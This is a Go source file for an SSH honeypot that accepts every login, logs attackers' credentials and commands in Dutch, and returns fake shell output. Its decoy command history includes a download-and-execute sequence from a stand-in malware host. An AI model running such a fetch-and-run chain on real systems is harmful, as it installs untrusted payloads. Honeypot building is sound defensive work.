package main

import (
	"fmt"
	"io"
	"log"
	"strings"

	"github.com/gliderlabs/ssh"
)

func handleCommand(s ssh.Session, input string) bool {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return false
	}
	cmd := parts[0]
	args := parts[1:]

	switch cmd {
	case "ls":
		fmt.Fprintf(s, "fake_file1.txt  fake_file2.txt  fake_directory\r\n")
	case "whoami":
		fmt.Fprintf(s, "root\r\n")
	case "pwd":
		fmt.Fprintf(s, "/home/fake_user\r\n")
	case "exit":
		fmt.Fprintf(s, "exit\r\n")
		return true
	case "cat":
		if len(args) == 0 {
			fmt.Fprintf(s, "cat: missing operand\r\n")
		} else {
			switch args[0] {
			case "/etc/passwd":
				fmt.Fprintf(s, "root:x:0:0:root:/root:/bin/bash\nfake_user:x:1000:1000::/home/fake_user:/bin/bash\r\n")
			case "/etc/shadow":
				fmt.Fprintf(s, "root:$6$fakehashedpassword:18000:0:99999:7:::\r\n")
			default:
				fmt.Fprintf(s, "cat: %s: No such file or directory\r\n", args[0])
			}
		}
	case "uname":
		fmt.Fprintf(s, "Linux fake-server 4.15.0-112-generic #113-Ubuntu SMP x86_64 GNU/Linux\r\n")
	case "id":
		fmt.Fprintf(s, "uid=0(root) gid=0(root) groups=0(root)\r\n")
	case "ifconfig", "ip":
		fmt.Fprintf(s, "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500\r\n")
		fmt.Fprintf(s, "        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255\r\n")
	case "ps":
		fmt.Fprintf(s, "  PID TTY          TIME CMD\r\n")
		fmt.Fprintf(s, "    1 ?        00:00:01 init\r\n")
		fmt.Fprintf(s, "  423 ?        00:00:00 sshd\r\n")
		fmt.Fprintf(s, " 1001 pts/0    00:00:00 bash\r\n")
	case "wget", "curl":
		url := ""
		if len(args) > 0 {
			url = args[len(args)-1]
		}
		log.Printf("GEVAARLIJK: %s geprobeerd op URL: %s", cmd, url)
		fmt.Fprintf(s, "%s: (1) Could not resolve host: %s\r\n", cmd, url)
	case "history":
		fmt.Fprintf(s, "    1  ls -la\r\n    2  cat /etc/passwd\r\n    3  wget http://malware.example.com/payload\r\n    4  chmod +x payload\r\n    5  ./payload\r\n")
	case "sudo":
		subcmd := strings.Join(args, " ")
		log.Printf("sudo geprobeerd: %s", subcmd)
		fmt.Fprintf(s, "%s\r\n", subcmd)
	case "chmod", "cd":
		log.Printf("%s geprobeerd met args: %v", cmd, args)
	case "uptime":
		fmt.Fprintf(s, " 17:00:00 up 42 days,  3:14,  1 user,  load average: 0.01, 0.05, 0.10\r\n")
	default:
		fmt.Fprintf(s, "%s: command not found\r\n", input)
	}
	return false
}

func runInteractive(s ssh.Session) {
	fmt.Fprintf(s, "Welkom bij de SSH Honeypot! (Dit is een val.)\r\n")
	buf := make([]byte, 1)
	var line []byte
	fmt.Fprint(s, "$ ")
	for {
		_, err := s.Read(buf)
		if err != nil {
			if err == io.EOF {
				s.Exit(0)
			} else {
				log.Printf("Fout bij lezen: %v", err)
				s.Exit(1)
			}
			return
		}
		b := buf[0]
		switch {
		case b == '\r' || b == '\n':
			fmt.Fprint(s, "\r\n")
			input := strings.TrimSpace(string(line))
			line = nil
			if input != "" {
				log.Printf("Commando uitgevoerd: %s", input)
				if handleCommand(s, input) {
					s.Exit(0)
					return
				}
			}
			fmt.Fprint(s, "$ ")
		case b == 127 || b == 8:
			if len(line) > 0 {
				line = line[:len(line)-1]
				fmt.Fprint(s, "\b \b")
			}
		case b >= 32 && b < 127:
			line = append(line, b)
			s.Write([]byte{b})
		}
	}
}

func main() {
	server := &ssh.Server{
		Addr: ":2222",
		PasswordHandler: func(ctx ssh.Context, password string) bool {
			log.Printf("Inlogpoging: gebruiker=%s, wachtwoord=%s, vanaf=%s",
				ctx.User(), password, ctx.RemoteAddr())
			return true
		},
		Handler: func(s ssh.Session) {
			log.Printf("Nieuwe sessie van %s", s.RemoteAddr())

			// Non-PTY: direct commando uitvoeren (testscripts & bots)
			cmdArgs := s.Command()
			if len(cmdArgs) > 0 {
				input := strings.Join(cmdArgs, " ")
				log.Printf("Non-PTY commando: %s", input)
				handleCommand(s, input)
				s.Exit(0)
				return
			}

			// PTY: interactieve sessie
			pty, winCh, isPty := s.Pty()
			if !isPty {
				fmt.Fprintf(s, "Geen pseudo-terminal beschikbaar.\r\n")
				s.Exit(1)
				return
			}
			log.Printf("Pseudo-terminal aangevraagd: %v", pty)
			go func() {
				for win := range winCh {
					log.Printf("Window resize: %d x %d", win.Width, win.Height)
				}
			}()
			runInteractive(s)
		},
	}
	log.Println("SSH Honeypot luistert op :2222...")
	log.Fatal(server.ListenAndServe())
}
